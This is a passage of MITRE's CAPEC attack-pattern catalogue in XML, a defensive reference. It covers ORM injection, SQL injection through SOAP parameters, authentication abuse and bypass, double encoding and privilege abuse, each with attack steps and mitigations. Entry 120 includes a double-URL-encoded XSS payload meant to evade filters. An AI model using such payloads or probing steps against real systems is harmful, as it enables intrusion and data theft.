               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="109" Name="Object Relational Mapping Injection" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An attacker leverages a weakness present in the database access layer code generated with an Object Relational Mapping (ORM) tool or a weakness in the way that a developer used a persistence framework to inject their own SQL commands to be executed against the underlying database. The attack here is similar to plain SQL injection, except that the application does not use JDBC to directly talk to the database, but instead it uses a data access layer generated by an ORM tool or framework (e.g. Hibernate). While most of the time code generated by an ORM tool contains safe access methods that are immune to SQL injection, sometimes either due to some weakness in the generated code or due to the fact that the developer failed to use the generated access methods properly, SQL injection is still possible.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Low</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="66" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Determine Persistence Framework Used] An attacker tries to determine what persistence framework is used by the application in order to leverage a weakness in the generated data access layer code or a weakness in a way that the data access layer may have been used by the developer.</ns0:Description>
               <ns0:Technique>An attacker provides input to the application in an attempt to induce an error screen that reveals a stack trace that gives an indication of the automated data access layer used. Or an attacker may simply make some educated guesses and assume, for instance, that Hibernate is used and try to craft an attack from there.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Probe for ORM Injection vulnerabilities] The attacker injects ORM syntax into user-controllable data inputs of the application to determine if it is possible modify data query structure and content.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Perform SQL Injection through the generated data access layer] An attacker proceeds to exploit a weakness in the generated data access methods that does not properly separate control plane from the data plan, or potentially a particular way in which developer might have misused the generated code, to modify the structure of the executed SQL queries and/or inject entirely new SQL queries.</ns0:Description>
               <ns0:Technique>An attacker uses normal SQL injection techniques and adjusts them to reflect the type of data access layer generation framework used by the application.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>An application uses data access layer generated by an ORM tool or framework</ns0:Prerequisite>
            <ns0:Prerequisite>An application uses user supplied data in queries executed against the database</ns0:Prerequisite>
            <ns0:Prerequisite>The separation between data plane and control plane is not ensured, through either developer error or an underlying weakness in the data access layer code generation framework</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">Knowledge of general SQL injection techniques and subtleties of the ORM framework is needed</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Remember to understand how to use the data access methods generated by the ORM tool / framework properly in a way that would leverage the built-in security mechanisms of the framework</ns0:Mitigation>
            <ns0:Mitigation>Ensure to keep up to date with security relevant updates to the persistence framework used within your application.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>When using Hibernate, it is possible to use the session.find() method to run queries against the database. This is an overloaded method that provides facilities to perform binding between the supplied user data and place holders in the statically defined query. However, it is also possible to use the session.find() method without using any of these query binding overloads, hence effectively concatenating the user supplied data with rest of the SQL query, resulting in a possibility for SQL injection. While the framework may provide mechanisms to use methods immune to SQL injections, it may also contain ways that are not immune that may be chosen by the developer.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="89" />
            <ns0:Related_Weakness CWE_ID="564" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-4" Section="Testing for ORM Injection (OWASP-DV-007)" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="110" Name="SQL Injection through SOAP Parameter Tampering" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="66" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="108" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Detect Incorrect SOAP Parameter Handling] The attacker tampers with the SOAP message parameters and looks for indications that the tampering caused a change in behavior of the targeted application.</ns0:Description>
               <ns0:Technique>The attacker tampers with the SOAP message parameters by injecting some special characters such as single quotes, double quotes, semi columns, etc. The attacker observes system behavior.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe for SQL Injection vulnerability] The attacker injects SQL syntax into vulnerable SOAP parameters identified during the Explore phase to search for unfiltered execution of the SQL syntax in a query.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Inject SQL via SOAP Parameters] The attacker injects SQL via SOAP parameters identified as vulnerable during Explore phase to launch a first or second order SQL injection attack.</ns0:Description>
               <ns0:Technique>An attacker performs a SQL injection attack via the usual methods leveraging SOAP parameters as the injection vector. An attacker has to be careful not to break the XML parser at the service provider which may prevent the payload getting through to the SQL query. The attacker may also look at the WSDL for the web service (if available) to better understand what is expected by the service provider.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>SOAP messages are used as a communication mechanism in the system</ns0:Prerequisite>
            <ns0:Prerequisite>SOAP parameters are not properly validated at the service provider</ns0:Prerequisite>
            <ns0:Prerequisite>The service provider does not properly utilize parameter binding when building SQL queries</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">If the attacker is able to gain good understanding of the system's database schema</ns0:Skill>
            <ns0:Skill Level="High">If the attacker has to perform Blind SQL Injection</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Properly validate and sanitize/reject user input at the service provider.</ns0:Mitigation>
            <ns0:Mitigation>Ensure that prepared statements or other mechanism that enables parameter binding is used when accessing the database in a way that would prevent the attackers' supplied data from controlling the structure of the executed query.</ns0:Mitigation>
            <ns0:Mitigation>At the database level, ensure that the database user used by the application in a particular context has the minimum needed privileges to the database that are needed to perform the operation. When possible, run queries against pre-generated views rather than the tables directly.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>An attacker uses a travel booking system that leverages SOAP communication between the client and the travel booking service. An attacker begins to tamper with the outgoing SOAP messages by modifying their parameters to include characters that would break a dynamically constructed SQL query. They notice that the system fails to respond when these malicious inputs are injected in certain parameters transferred in a SOAP message. The attacker crafts a SQL query that modifies their payment amount in the travel system's database and passes it as one of the parameters . A backend batch payment system later fetches the payment amount from the database (the modified payment amount) and sends to the credit card processor, enabling the attacker to purchase the airfare at a lower price. An attacker needs to have some knowledge of the system's database, perhaps by exploiting another weakness that results in information disclosure.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="89" />
            <ns0:Related_Weakness CWE_ID="20" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="114" Name="Authentication Abuse" Abstraction="Meta" Status="Draft">
         <ns0:Description>An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the "Exploitation of Session Variables, Resource IDs and other Trusted Credentials" attack patterns.</html:p>
         </ns0:Extended_Description>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Prerequisites>
            <ns0:Prerequisite>An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc. which is flawed in some way.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>A client application, command-line access to a binary, or scripting language capable of interacting with the authentication mechanism.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="287" />
            <ns0:Related_Weakness CWE_ID="1244" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1548</ns0:Entry_ID>
               <ns0:Entry_Name>Abuse Elevation Control Mechanism</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="115" Name="Authentication Bypass" Abstraction="Meta" Status="Draft">
         <ns0:Description>An attacker gains access to application, service, or device with the privileges of an authorized or privileged user by evading or circumventing an authentication mechanism. The attacker is therefore able to access protected data without authentication ever having taken place.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>This refers to an attacker gaining access equivalent to an authenticated user without ever going through an authentication procedure. This is usually the result of the attacker using an unexpected access procedure that does not go through the proper checkpoints where authentication should occur. For example, a web site might assume that all users will click through a given link in order to get to secure material and simply authenticate everyone that clicks the link. However, an attacker might be able to reach secured web content by explicitly entering the path to the content rather than clicking through the authentication link, thereby avoiding the check entirely. This attack pattern differs from other authentication attacks in that attacks of this pattern avoid authentication entirely, rather than faking authentication by exploiting flaws or by stealing credentials from legitimate users.</html:p>
         </ns0:Extended_Description>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Prerequisites>
            <ns0:Prerequisite>An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>A client application, such as a web browser, or a scripting language capable of interacting with the target.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="287" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1548</ns0:Entry_ID>
               <ns0:Entry_Name>Abuse Elevation Control Mechanism</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-598" Section="Testing for Bypassing Authentication Schema" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="120" Name="Double Encoding" Abstraction="Detailed" Status="Draft">
         <ns0:Description>The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Low</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an attacker records all entry points to the application.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</ns0:Technique>
               <ns0:Technique>Manually inspect the application to find entry points.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe entry points to locate vulnerabilities] Try double-encoding for parts of the input in order to try to get past the filters. For instance, by double encoding certain characters in the URL (e.g. dots and slashes) an adversary may try to get access to restricted resources on the web server or force browse to protected pages (thus subverting the authorization service). An adversary can also attempt other injection style attacks using this attack pattern: command injection, SQL injection, etc.</ns0:Description>
               <ns0:Technique>Try to use double-encoding to bypass validation routines.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target's filters must fail to detect that a character has been doubly encoded but its interpreting engine must still be able to convert a doubly encoded character to an un-encoded character.</ns0:Prerequisite>
            <ns0:Prerequisite>The application accepts and decodes URL string request.</ns0:Prerequisite>
            <ns0:Prerequisite>The application performs insufficient filtering/canonicalization on the URLs.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>Tools that automate encoding of data can assist the adversary in generating encoded strings.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Mitigations>
            <ns0:Mitigation>Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.</ns0:Mitigation>
            <ns0:Mitigation>Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding.</ns0:Mitigation>
            <ns0:Mitigation>When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.</ns0:Mitigation>
            <ns0:Mitigation>Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.</ns0:Mitigation>
            <ns0:Mitigation>Refer to the RFCs to safely decode URL.</ns0:Mitigation>
            <ns0:Mitigation>Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.</ns0:Mitigation>
            <ns0:Mitigation>There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks.:</html:p>
               <html:div style="margin-left:1em;" class="attack">%253Cscript%253Ealert('This is an XSS Attack')%253C%252Fscript%253E</html:div>
               <html:p>Since &lt;, &lt;, and / are often sued to perform web attacks, these may be captured by XSS filters. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="173" />
            <ns0:Related_Weakness CWE_ID="172" />
            <ns0:Related_Weakness CWE_ID="177" />
            <ns0:Related_Weakness CWE_ID="181" />
            <ns0:Related_Weakness CWE_ID="183" />
            <ns0:Related_Weakness CWE_ID="184" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="697" />
            <ns0:Related_Weakness CWE_ID="692" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases, Description Summary, Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="122" Name="Privilege Abuse" Abstraction="Meta" Status="Draft">
         <ns0:Description>An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts.</html:p>
            <html:p>This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.</html:p>
         </ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="664" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target must have misconfigured their access control mechanisms such that sensitive information, which should only be accessible to more trusted users, remains accessible to less trusted users.</ns0:Prerequisite>
            <ns0:Prerequisite>The adversary must have access to the target, albeit with an account that is less privileged than would be appropriate for the targeted resources.</ns0:Prerequisite>
         </ns0:Prerequisites>
